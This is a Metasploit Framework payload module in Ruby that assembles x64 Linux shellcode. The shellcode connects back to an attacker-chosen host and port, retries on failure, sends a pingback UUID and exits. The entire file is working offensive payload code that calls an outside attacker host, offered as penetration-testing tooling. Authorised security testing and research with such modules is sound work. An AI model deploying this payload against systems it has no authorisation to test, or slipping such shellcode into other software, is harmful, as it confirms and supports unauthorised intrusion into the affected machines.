##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 125

  include Msf::Payload::Linux::X64::Prepends
  include Msf::Payload::Single
  include Msf::Payload::Pingback
  include Msf::Payload::Pingback::Options

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux x64 Pingback, Reverse TCP Inline',
        'Description' => 'Connect back to attacker and report UUID (Linux x64)',
        'Author' => [ 'bwatters-r7' ],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_X64,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::Pingback
      )
    )
  end

  def generate(_opts = {})
    # 22 -> "0x00,0x16"
    # 4444 -> "0x11,0x5c"
    encoded_port = [datastore['LPORT'].to_i, 2].pack('vn').unpack('N').first
    encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || '127.127.127.127').unpack('V').first
    encoded_host_port = format('0x%<encoded_host>.8x%<encoded_port>.8x', { encoded_host: encoded_host, encoded_port: encoded_port })
    retry_count = [datastore['ReverseConnectRetries'].to_i, 1].max

    self.pingback_uuid ||= generate_pingback_uuid
    uuid_as_db = '0x' + self.pingback_uuid.chars.each_slice(2).map(&:join).join(',0x')
    seconds = 5.0
    sleep_seconds = seconds.to_i
    sleep_nanoseconds = (seconds % 1 * 1_000_000_000).to_i

    asm = %^
        push   #{retry_count}        ; retry counter
        pop    r9
        push   rsi
        push   rax
        push   0x29
        pop    rax
        cdq
        push   0x2
        pop    rdi
        push   0x1
        pop    rsi
        syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
        test   rax, rax
        js failed

        xchg   rdi, rax

      connect:
        mov    rcx, #{encoded_host_port}
        push   rcx
        mov    rsi, rsp
        push   0x10
        pop    rdx
        push   0x2a
        pop    rax
        syscall ; connect(3, {sa_family=AF_INET, LPORT, LHOST, 16)
        pop    rcx
        test   rax, rax
        jns    send_pingback

      handle_failure:
        dec    r9
        jz     failed
        push   rdi
        push   0x23
        pop    rax
        push   0x#{sleep_nanoseconds.to_s(16)}
        push   0x#{sleep_seconds.to_s(16)}
        mov    rdi, rsp
        xor    rsi, rsi
        syscall                      ; sys_nanosleep
        pop    rcx
        pop    rcx
        pop    rdi
        test   rax, rax
        jns    connect

      failed:
        push   0x3c
        pop    rax
        push   0x1
        pop    rdi
        syscall ; exit(1)

      send_pingback:
        push #{uuid_as_db.split(',').length} ; length of the PINGBACK UUID
        pop rdx
        call get_uuid_address         ; put uuid buffer on the stack
        db #{uuid_as_db}  ; PINGBACK_UUID

      get_uuid_address:
        pop rsi                       ; UUID address
        xor rax, rax
        inc rax
        syscall                      ; sys_write

      jmp failed
      ^
    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
  end
end
